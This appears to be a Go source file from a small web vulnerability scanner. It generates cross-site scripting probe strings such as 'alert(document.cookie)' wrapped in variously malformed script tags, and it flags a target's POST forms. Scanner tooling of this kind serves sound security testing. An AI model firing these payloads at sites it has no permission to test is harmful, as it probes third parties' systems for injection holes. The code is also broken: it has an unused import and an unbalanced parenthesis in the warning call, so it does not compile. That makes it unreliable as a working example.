package handlers

import (
	"log"
	"strconv"

	"github.com/xtasysensei/vultest/cmd/utils"
)

func GeneratePayload(eff int) (string, error) {
	payloads := []string{
		"prompt(5000/200)",
		"alert(6000/3000)",
		"alert(document.cookie)",
		"prompt(document.cookie)",
		"console.log(5000/3000)",
	}

	if eff == 1 {
		return "<script/>" + payloads[utils.RandRange(0, 4)] + `<\script\>`, nil
	} else if eff == 2 {
		return `<\script/>` + payloads[utils.RandRange(0, 4)] + `<\\script>`, nil

	} else if eff == 3 {
		return `<\script\>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil
	} else if eff == 4 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `<\script/>`, nil

	} else if eff == 5 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil

	} else if eff == 6 {
		return `<script>` + payloads[utils.RandRange(0, 4)] + `</script>`, nil

	}

	return "", nil
}

func GetFormMethod(url string) {
	forms, err := GetForms(url)
	if err != nil {
		log.Fatalf("url connection err: %v\n", err)
	}
	for _, form := range forms {
		if form.Method == "post" {
			utils.Warning("Target have form with POST method: " +
				utils.C + url+"/"+ form.Action))
		}
	}
}
